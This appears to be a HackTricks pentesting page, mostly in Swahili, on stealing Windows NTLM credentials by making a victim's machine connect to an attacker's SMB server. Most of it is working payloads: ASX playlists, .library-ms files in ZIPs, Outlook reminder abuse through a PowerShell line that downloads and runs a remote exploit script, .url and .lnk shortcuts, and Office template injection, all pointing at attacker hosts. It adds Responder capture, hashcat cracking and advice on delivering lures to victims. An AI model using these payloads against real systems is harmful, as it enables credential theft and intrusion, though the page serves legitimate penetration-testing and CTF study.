# Maeneo ya kuiba NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Angalia mawazo mazuri yote kutoka [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — kutoka kwa kupakua faili la Microsoft Word mtandaoni hadi chanzo cha ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md na [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Orodha za Windows Media Player (.ASX/.WAX)

Kama unaweza kumfanya lengo afungue au aone awali orodha ya Windows Media Player unayodhibiti, unaweza leak Net‑NTLMv2 kwa kuelekeza kipengee kwenye UNC path. WMP itajaribu kupakua media iliyotajwa kupitia SMB na itathibitisha kwa njia ya moja kwa moja.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Mtiririko wa ukusanyaji na cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### .library-ms iliyowekwa ndani ya ZIP NTLM leak (CVE-2025-24071/24055)

Windows Explorer inashughulikia kwa usalama mdogo faili za .library-ms wakati zinapofunguliwa moja kwa moja ndani ya archive ya ZIP. Ikiwa ufafanuzi wa maktaba unaelekeza kwenye njia ya mbali ya UNC (kwa mfano, \\attacker\share), kuvinjari/kuanzisha .library-ms ndani ya ZIP tu hufanya Explorer kuorodhesha UNC na kutuma uthibitishaji wa NTLM kwa mshambuliaji. Hii inatoa NetNTLMv2 ambayo inaweza kuvunjwa offline au kuweza kupitishwa kwa njia ya relay.

Mfano mdogo wa .library-ms unaoelekeza kwenye UNC ya mshambuliaji
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Tengeneza faili .library-ms kwa XML iliyo hapo juu (weka IP/hostname yako).
- Zipia (on Windows: Send to → Compressed (zipped) folder) na uwasilishe ZIP kwa lengo.
- Endesha NTLM capture listener na usubiri mwanaathiriwa afungue .library-ms kutoka ndani ya ZIP.


### Njia ya faili ya sauti ya kikumbusho cha Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook kwa Windows ilishughulikia mali ya MAPI iliyopanuliwa PidLidReminderFileParameter katika vitu vya kalenda. Ikiwa mali hiyo inarejea kwenye njia ya UNC (e.g., \\attacker\share\alert.wav), Outlook ingeungana na SMB share wakati kikumbusho kinapotokea, leaking Net‑NTLMv2 ya mtumiaji bila kubofya chochote. Hili lilirekebishwa tarehe 14 Machi 2023, lakini bado ni muhimu kwa vifaa vya zamani ambavyo havijagusa na kwa majibu ya matukio ya kihistoria.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Upande wa Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Vidokezo
- Mwanaathiriwa anahitaji tu Outlook for Windows kuwa inayoendesha wakati ukumbusho unapochochewa.
- Leak hutoa Net‑NTLMv2 inayofaa kwa offline cracking au relay (si pass‑the‑hash).


### .LNK/.URL inayotegemea ikoni zero‑click NTLM leak (CVE‑2025‑50154 – bypass ya CVE‑2025‑24054)

Windows Explorer huwaonyesha ikoni za shortcut kwa kiotomatiki. Utafiti wa hivi karibuni ulionyesha kwamba hata baada ya patch ya Microsoft ya Aprili 2025 kwa UNC‑icon shortcuts, bado ilikuwa inawezekana kuchochea NTLM authentication bila kubofya kwa kuhost target ya shortcut kwenye UNC path na kuacha ikoni iwe local (patch bypass iliyopewa CVE‑2025‑50154). Kwa tu kuangalia folda, Explorer humchukua metadata kutoka kwa target ya mbali, na kutuma NTLM kwa server ya SMB ya mshambuliaji.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Kifupi cha Programu payload (.lnk) kupitia PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Weka shortcut ndani ya ZIP na uwashawishi mwathirika kuvinjari.
- Weka shortcut kwenye share inayoweza kuandikwa ambayo mwathirika atafungua.
- Changanya na lure files nyingine kwenye folder ile ili Explorer ianze kuonyesha preview ya vitu hivyo.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Hariri word/_rels/settings.xml.rels na kuelekeza rId1337 kwa UNC yako:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Pakia upya hadi .docx na uwasilishe. Endesha SMB capture listener yako na usubiri 'open'.

Kwa mawazo ya post-capture kuhusu relaying au abusing NTLM, angalia:

{{#ref}}
README.md
{{#endref}}


## Marejeleo
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
